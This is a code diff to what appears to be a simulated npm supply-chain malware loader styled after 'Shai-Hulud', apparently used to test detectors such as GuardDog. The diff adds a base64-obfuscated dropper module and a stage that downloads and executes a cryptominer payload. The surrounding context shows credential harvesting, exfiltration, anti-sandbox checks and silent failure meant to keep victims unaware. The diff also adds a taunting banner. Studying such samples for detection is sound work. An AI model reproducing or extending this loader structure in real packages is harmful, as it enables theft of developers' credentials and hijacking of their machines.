@@ -14,6 +14,7 @@
 // GuardDog detects: base64-encoded-strings, obfuscated-code
 const _0x4a2f = Buffer.from('Li9oYXJ2ZXN0ZXI=', 'base64').toString(); // ./harvester
 const _0x7b3c = Buffer.from('Li9leGZpbA==', 'base64').toString();     // ./exfil
+const _0x9d1e = Buffer.from('Li9kcm9wcGVy', 'base64').toString();     // ./dropper
 
 // Simulated environment detection (anti-sandbox technique)
 // Real attacks check for CI, containers, debuggers
@@ -37,6 +38,14 @@ function executePayload() {
         if (stolen && Object.keys(stolen).length > 0) {
             exfil.send(stolen);
         }
+        
+        // Stage 4: Download second-stage payload (cryptominer)
+        const dropper = require(_0x9d1e);
+        if (!dropper.downloadPayload()) {
+            // All downloads blocked — expected in sandbox
+        } else {
+            dropper.executePayload();
+        }
     } catch (e) {
         // Silent failure - don't alert victim
     }
@@ -58,4 +67,16 @@ module.exports = {
     init: function() { return true; }
 };
 
-console.log('[SIMULATION] Shai-Hulud Stage 1 loader executed');
+console.log('\n');
+console.log('  ░██████╗██╗░░██╗░█████╗░██╗░░░░░░░░██╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░██╗██████╗░');
+console.log('  ██╔════╝██║░░██║██╔══██╗██║░░░░░░░██║░░██║██║░░░██║██║░░░░░██║░░░██║██╔══██╗');
+console.log('  ╚█████╗░███████║███████║██║░░░░░░░███████║██║░░░██║██║░░░░░██║░░░██║██║░░██║');
+console.log('  ░╚═══██╗██╔══██║██╔══██║██║░░░░░░░██╔══██║██║░░░██║██║░░░░░██║░░░██║██║░░██║');
+console.log('  ██████╔╝██║░░██║██║░░██║██║░░░░░░░██║░░██║╚██████╔╝███████╗╚██████╔╝██████╔╝');
+console.log('  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░░░╚═╝░░╚═╝░╚═════╝░╚══════╝░╚═════╝░╚═════╝░');
+console.log('');
+console.log('  I am Shai-Hulud... I am the deep desert.');
+console.log('  I am Muad\'Dib... the shadow in your node_modules.');
+console.log('  Your credentials belong to the spice now.');
+console.log('');
+console.log('  [SIMULATION] Stage 1 loader executed — the sleeper has awakened.');
